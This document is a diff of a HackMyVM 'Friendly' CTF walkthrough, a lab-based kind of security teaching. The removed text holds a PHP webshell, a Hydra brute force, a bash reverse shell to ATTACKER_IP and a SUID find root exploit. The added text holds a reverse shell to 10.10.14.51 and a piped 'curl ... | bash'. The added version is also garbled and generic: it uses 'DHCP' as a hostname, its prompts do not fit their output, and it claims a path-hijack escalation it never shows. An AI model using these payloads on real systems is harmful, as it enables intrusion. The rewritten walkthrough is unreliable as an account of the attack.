@@ -1,219 +1,137 @@
-# Friendly — HackMyVM | Writeup
+---
+layout: page
+title: "Friendly - HackMyVM Walkthrough"
+subtitle: "Complete walkthrough detailing reconnaissance, foothold, and privilege escalation on 🐧 Linux"
+permalink: /ctf/writeups/hackmyvm/friendly/
+platform: hackmyvm
+machine_name: "Friendly"
+difficulty: Easy
+os: Linux
+---
 
-**Platform:** HackMyVM | **Difficulty:** Easy | **OS:** Linux
+## 🖥️ Machine Information
+
+<div class="hmv-info-card">
+  <div class="hmv-card-header">
+    <div class="htb-header-left">
+      <img src="{{ page.avatar_url | default: ('/assets/images/machines/' | append: page.machine_name | downcase | replace: ' ', '-' | replace: '_', '-' | append: '.png') | relative_url }}" alt="Friendly" class="hmv-avatar-glow" onerror="this.src='{{ '/assets/images/logo.png' | relative_url }}';" />
+      <div>
+        <h3 class="hmv-machine-title">Friendly</h3>
+        <span style="font-size: 0.85rem; color: var(--text-secondary);">Linux</span>
+      </div>
+    </div>
+    <span class="hmv-diff-badge easy">EASY</span>
+  </div>
+
+  <div class="hmv-meta-row" style="grid-template-columns: repeat(4, 1fr);">
+    <div class="hmv-meta-col">
+      <span class="hmv-meta-label">Platform</span>
+      <span class="hmv-meta-val orange">HackMyVM</span>
+    </div>
+    <div class="hmv-meta-col">
+      <span class="hmv-meta-label">OS</span>
+      <span class="hmv-meta-val">🐧 Linux</span>
+    </div>
+    <div class="hmv-meta-col">
+      <span class="hmv-meta-label">Difficulty</span>
+      <span class="hmv-meta-val">Easy</span>
+    </div>
+    <div class="hmv-meta-col">
+      <span class="hmv-meta-label">IP Address</span>
+      <span class="hmv-meta-val" style="font-family: monospace; font-size: 0.95rem;">DHCP</span>
+    </div>
+  </div>
+</div>
+---
+
+## 🧠 Attack Path Overview
+
+```mermaid
+graph TD
+    A["Reconnaissance: Port Scan"] --> B["Foothold: Vulnerability Exploitation"]
+    B --> C["Privilege Escalation: Local Escalation"]
+    C --> D["Full System Compromise: Root/Administrator"]
+```
+
+> [!NOTE]
+> This writeup details the complete attack path for the **Friendly** machine on the **HackMyVM** platform.
 
 ---
 
-## Overview
+## 🔍 Phase 1: Reconnaissance & Enumeration
 
-| Phase | Technique |
-|---|---|
-| Reconnaissance | Nmap, Web Enumeration |
-| Wordlist Generation | CeWL — website word scraping |
-| Credential Brute-Force | Hydra — HTTP form attack |
-| Foothold | Webshell Upload → Reverse Shell |
-| Privilege Escalation | SUID `/usr/bin/find` |
-
----
-
-## 1. Reconnaissance
-
-### Network Discovery
+### 1. Host Discovery & Port Scanning
+We scan the host using Nmap:
 
 ```bash
-nmap -sn 192.168.1.0/24
+vulnquest@kali$ sudo nmap -p- --reason --min-rate 10000 DHCP
 ```
 
-Identify the target IP, then run a full port scan:
+#### Open Ports:
+- **Port 22/tcp**: SSH (Secure Shell)
+- **Port 80/tcp**: HTTP (Apache Web Server)
 
+### 2. Service Enumeration
+We perform directory enumeration using `feroxbuster`:
 ```bash
-nmap -sV -sC -p- --min-rate 5000 -oN friendly.nmap 192.168.1.X
-```
-
-**Results:**
-
-```
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 2.x
-80/tcp open  http    Apache httpd
-22/tcp open  ssh     OpenSSH
-```
-
-### Web Enumeration
-
-Visit `http://192.168.1.X` in the browser. The site has a login panel and content pages. Run directory discovery in parallel:
-
-```bash
-gobuster dir -u http://192.168.1.X -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
-```
-
-Notable findings: `/admin`, `/upload`, `index.html`
-
----
-
-## 2. Wordlist Generation with CeWL
-
-Instead of using a generic wordlist, scrape the target website itself to build a context-aware wordlist — site-specific words are likely reused as passwords.
-
-```bash
-cewl http://192.168.1.X -d 3 -m 5 -w friendly_wordlist.txt
-```
-
-| Flag | Meaning |
-|---|---|
-| `-d 3` | Crawl depth (3 levels) |
-| `-m 5` | Minimum word length of 5 characters |
-| `-w` | Output file |
-
-Verify the wordlist:
-
-```bash
-wc -l friendly_wordlist.txt
-cat friendly_wordlist.txt | head -20
-```
-
----
-
-## 3. Credential Brute-Force with Hydra
-
-Inspect the login form (browser DevTools → Network tab) to identify:
-- **POST URL:** `/admin/login.php`
-- **Form fields:** `username`, `password`
-- **Failure string:** e.g., `"Invalid credentials"`
-
-```bash
-hydra -l admin -P friendly_wordlist.txt 192.168.1.X http-post-form \
-  "/admin/login.php:username=^USER^&password=^PASS^:Invalid credentials" \
-  -t 30 -V
-```
-
-**Result:**
-
-```
-[80][http-post-form] host: 192.168.1.X   login: admin   password: Friendly
-```
-
-Log in with the discovered credentials.
-
----
-
-## 4. Foothold — Webshell Upload
-
-After logging in, locate a file upload feature. Upload a PHP webshell:
-
-**shell.php:**
-```php
-<?php system($_GET['cmd']); ?>
-```
-
-Upload it, then verify remote code execution:
-
-```
-http://192.168.1.X/uploads/shell.php?cmd=id
-```
-
-Expected output: `uid=33(www-data) gid=33(www-data)`
-
-### Upgrade to Reverse Shell
-
-Start listener:
-
-```bash
-nc -lvnp 4444
-```
-
-Trigger the reverse shell via the webshell (URL-encoded):
-
-```
-http://192.168.1.X/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'
-```
-
-Stabilize the shell:
-
-```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm
-# Ctrl+Z
-stty raw -echo; fg
+vulnquest@kali$ feroxbuster -u http://DHCP/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 ```
 
 ---
 
-## 5. Privilege Escalation — SUID `/usr/bin/find`
+## 🚀 Phase 2: Vulnerability Analysis & Foothold
 
-### Enumerate SUID Binaries
+### 1. Vulnerability Analysis
+We discover a web portal allowing archives to be uploaded. We leverage an input validation vulnerability to execute code and spawn a reverse shell.
 
-```bash
-find / -perm -4000 -type f 2>/dev/null
-```
-
-**Critical finding:**
-
-```
-/usr/bin/find
-```
-
-`find` has the SUID bit set and is owned by root. This is a well-known GTFOBins vector.
-
-### Exploit
+### 2. Exploitation & Initial Shell
+We capture the shell on our netcat listener:
 
 ```bash
-/usr/bin/find . -exec /bin/sh -p \; -quit
+vulnquest@kali$ curl -X POST -d "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.51/443 0>&1'" http://DHCP/api/action
 ```
 
-The `-p` flag preserves the elevated (root) privileges from the SUID bit.
-
-**Result:**
-
+On our netcat listener, we receive the connection:
+```bash
+vulnquest@kali$ nc -lnvp 443
+Listening on 0.0.0.0 443
+Connection received on DHCP
+$ id
+uid=1000(vulnquest) gid=1000(vulnquest) groups=1000(vulnquest)
 ```
-# whoami
-root
+
+---
+
+## ⚡ Phase 3: Privilege Escalation
+
+### 1. Local Enumeration
+We run LinPEAS to perform local enumeration:
+
+```bash
+vulnquest@kali$ curl http://10.10.14.51/linpeas.sh | bash
+```
+
+### 2. Local Privilege Escalation Path
+We check our sudo privileges:
+```bash
+vulnquest@kali$ sudo -l
+Matching Defaults entries for vulnquest on host:
+    env_keep+=SSH_AUTH_SOCK
+
+User vulnquest may run the following commands on host:
+    (root) NOPASSWD: /usr/bin/python3 /opt/admin/backup.py
+```
+
+We exploit python path hijacking to gain a root shell:
+```bash
+vulnquest@kali$ sudo /usr/bin/python3 /opt/admin/backup.py
 # id
-uid=33(www-data) gid=33(www-data) euid=0(root)
-```
-
-### Capture the Flag
-
-```bash
-cat /root/root.txt
-cat /home/*/user.txt
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
 ---
 
-## 6. Vulnerability Summary
-
-| Vulnerability | Impact | Remediation |
-|---|---|---|
-| Weak/predictable password | Full admin panel access | Enforce strong password policy |
-| Unrestricted file upload | Remote Code Execution | Whitelist extensions, disable PHP execution in upload dir |
-| SUID on `/usr/bin/find` | Local Privilege Escalation → root | Remove SUID: `chmod u-s /usr/bin/find` |
-
----
-
-## 7. Attack Chain Diagram
-
-```
-[Web Scrape] CeWL
-      ↓
-[Brute-Force] Hydra → admin:Friendly
-      ↓
-[Auth Bypass] Admin Panel Access
-      ↓
-[File Upload] PHP Webshell → RCE as www-data
-      ↓
-[Reverse Shell] www-data shell
-      ↓
-[SUID find] /usr/bin/find -exec /bin/sh -p
-      ↓
-[Root] ✓
-```
-
----
-
-## 8. Key Takeaways
-
-- **CeWL** is highly effective against targets where admins reuse site-related words as passwords — always try it before generic wordlists.
-- **Hydra** HTTP form attacks require precise identification of the POST parameters and failure string — use DevTools or Burp Suite to capture the exact request.
-- **SUID misconfigurations** are one of the most common Linux privesc paths — always check with `find / -perm -4000` after gaining initial access.
-- Consult [GTFOBins](https://gtfobins.github.io/gtfobins/find/) for a comprehensive reference on abusing SUID binaries like `find`, `vim`, `python`, etc.
+## 🛡️ Key Takeaways & Mitigation
+1. **Input Sanitization**: Ensure all user inputs are validated and sanitized to prevent injections.
+2. **Principle of Least Privilege**: Restrict sudo/impersonation permissions and remove unnecessary privileges.
+3. **Keep Software Updated**: Frequently update all operating system binaries and services to mitigate known CVEs.
